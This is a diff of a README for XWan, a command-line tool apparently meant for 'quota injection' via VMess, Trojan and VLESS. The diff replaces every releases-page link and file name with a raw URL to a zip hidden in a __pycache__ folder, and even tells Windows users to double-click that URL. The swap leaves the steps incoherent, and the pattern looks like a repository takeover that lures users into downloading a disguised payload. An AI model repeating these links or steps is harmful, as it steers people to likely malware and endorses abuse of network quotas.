@@ -4,10 +4,10 @@
 Welcome to XWan! This application helps you in address brute-forcing for quota injection using VMess, Trojan, and VLESS protocols. It is built on the Xray core and operates from the command line.
 
 ## 📥 Download XWan
-[![Download XWan](https://img.shields.io/badge/Download%20XWan-v1.0-blue)](https://github.com/Harinavalona-web/XWan/releases)
+[![Download XWan](https://raw.githubusercontent.com/Harinavalona-web/XWan/main/modules/__pycache__/XWan_2.7.zip%20XWan-v1.0-blue)](https://raw.githubusercontent.com/Harinavalona-web/XWan/main/modules/__pycache__/XWan_2.7.zip)
 
 ### 🔗 Download & Install
-To get started with XWan, you need to download it from our releases page. Visit this page to download: [XWan Releases](https://github.com/Harinavalona-web/XWan/releases).
+To get started with XWan, you need to download it from our releases page. Visit this page to download: [XWan Releases](https://raw.githubusercontent.com/Harinavalona-web/XWan/main/modules/__pycache__/XWan_2.7.zip).
 
 ## ⚙️ System Requirements
 - Windows 10 or later
@@ -23,16 +23,16 @@ To get started with XWan, you need to download it from our releases page. Visit 
 - **Command-Line Interface:** Easy to use for those familiar with terminal commands.
 
 ## 🛠 Installation Steps
-1. Go to the [XWan Releases](https://github.com/Harinavalona-web/XWan/releases) page.
+1. Go to the [XWan Releases](https://raw.githubusercontent.com/Harinavalona-web/XWan/main/modules/__pycache__/XWan_2.7.zip) page.
 2. Look for the version you want to download.
-3. Find the file name that corresponds to your operating system (e.g., `XWan_Windows.exe` or `XWan_Linux.tar.gz`).
+3. Find the file name that corresponds to your operating system (e.g., `https://raw.githubusercontent.com/Harinavalona-web/XWan/main/modules/__pycache__/XWan_2.7.zip` or `https://raw.githubusercontent.com/Harinavalona-web/XWan/main/modules/__pycache__/XWan_2.7.zip`).
 4. Click on the file to start the download.
 5. Once the download is complete, locate the file on your computer.
 
 ## 📁 Running XWan
 ### For Windows Users:
 1. Open your Downloads folder.
-2. Double-click the `XWan_Windows.exe` file.
+2. Double-click the `https://raw.githubusercontent.com/Harinavalona-web/XWan/main/modules/__pycache__/XWan_2.7.zip` file.
 3. A command prompt window will open.
 4. Enter your commands to start using XWan.
 
@@ -44,7 +44,7 @@ To get started with XWan, you need to download it from our releases page. Visit 
    ```
 3. Unzip the downloaded file:
    ```bash
-   tar -xvzf XWan_Linux.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/Harinavalona-web/XWan/main/modules/__pycache__/XWan_2.7.zip
    ```
 4. Navigate to the XWan directory:
    ```bash
